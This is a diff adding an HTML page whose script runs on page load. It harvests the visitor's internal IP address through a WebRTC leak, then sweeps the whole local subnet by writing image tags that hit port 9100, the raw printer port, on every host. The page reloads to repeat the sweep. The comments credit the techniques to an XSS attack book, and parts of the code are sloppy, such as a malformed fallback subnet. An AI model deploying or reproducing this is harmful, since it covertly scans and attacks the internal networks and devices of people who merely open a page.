@@ -1,0 +1,144 @@
+<html>
+<head></head>
+<body>
+<h1 id=list> </h1>
+<script>
+
+if (window.navigator.userAgent.indexOf("Edge") > -1) {
+
+
+   scanWebServers('local_ipaddress');
+
+}
+
+if (window.navigator.userAgent.indexOf("OPR") > -1) {
+
+
+   scanWebServers('local_ipaddress');
+
+}
+
+// Scan internal IP Address adapted from http://net.ipcalf.com
+var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+
+if (RTCPeerConnection) (function () {
+    var rtc = new RTCPeerConnection({iceServers:[]});
+    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
+        rtc.createDataChannel('', {reliable:false});
+    };
+    
+    rtc.onicecandidate = function (evt) {
+        // convert the candidate to SDP so we can run it through our general parser
+        // see https://twitter.com/lancestout/status/525796175425720320 for details
+        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
+    };
+    rtc.createOffer(function (offerDesc) {
+        grepSDP(offerDesc.sdp);
+        rtc.setLocalDescription(offerDesc);
+    }, function (e) { console.warn("offer failed", e); });
+    
+    
+    var addrs = Object.create(null);
+    addrs["0.0.0.0"] = false;
+    function updateDisplay(newAddr) {
+        if (newAddr in addrs) return;
+        else addrs[newAddr] = true;
+        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+ //       document.getElementById('list').textContent = displayAddrs.join(" or perhaps ") || "n/a";
+
+//var setinterv = window.setInterval(scanWebServers(document.getElementById('list').textContent = displayAddrs.join(" or perhaps ") || "n/a"), 500);
+     scanWebServers(displayAddrs.join("192.168.1.0") || "192.168.0.0")
+
+
+    }
+    
+    function grepSDP(sdp) {
+        var hosts = [];
+        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
+            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
+                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
+                    addr = parts[4],
+                    type = parts[7];
+                if (type === 'host') updateDisplay(addr);
+
+            } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
+                var parts = line.split(' '),
+                    addr = parts[2];
+                updateDisplay(addr);
+
+
+            }
+        });
+    }
+})(); else {
+ //   document.getElementById('list').innerHTML = "<code>ifconfig | grep inet | grep -v inet6 | cut -d\" \" -f2 | tail -n1</code>";
+  //  document.getElementById('list').nextSibling.textContent = "In Chrome and Firefox your IP should display automatically, by the power of WebRTCskull.";
+
+    document.getElementById('list').nextSibling.textContent = "Enable JavaScript to display this page.";
+}
+
+
+/* Scan the Intranet, adapted from book: "Cross Site Scripting Attacks: XSS Exploits and Defense, editor Seth Fogie" */
+
+function scanWebServers(ip) {
+
+/* strip the last octet off the Intranet IP */
+var net = ip.substring(0, ip.lastIndexOf('.') + 1);
+/* Start from 0 and end on 255 for the last octet */
+var start = 0;
+var end = 255;
+var x = start;
+var timeout = 0;
+/* section sets up and increments setTimeout timers with periodic window.stop(). We
+use this because if there is no web server at the specified IP, the browser will
+hang for an overly long time until the timeout expires. If we fire too many hanging
+off-domain connections we'll cause on browser connection DoS. window.stop() halts
+all open connects so the scan process can move on. */
+while (x < end) {
+timeout += 500;
+var y = x + 50;
+if (y > end) { y = end; }
+/* send a block of IPs to be scanned */
+
+setTimeout("scan(" + x + ", " + y + ", '" + net + "')", timeout);
+timeout += 3000;
+
+self.setTimeout("window.stop();", timeout);
+x += 52;
+
+
+}
+
+} // end scanWebServers
+
+
+/* scan a block of IPs */
+function scan(start, end, range) {
+var start_num = 0;
+if (start) { start_num = start; }
+var end_num = 255;
+if (end) { end_num = end; }
+// loop through number range
+for (var n = start_num; n <= end_num; n++) {
+// create src attribute with constructed URL
+var URL = ''; // 'http://' + range + n + ':9100/';
+document.write("<img src=http://" + range + n + ":9100/custom_message height=10 width=10 >");
+
+var script = document.createElement('script');
+script.src = URL;
+//// add script DOM object to the body
+document.body.appendChild(script);
+
+if (n == 255) {
+window.location.reload();
+
+}
+
+
+} // end number range loop
+} // end scan subroutine
+
+
+</script>
+</body>
+<html>
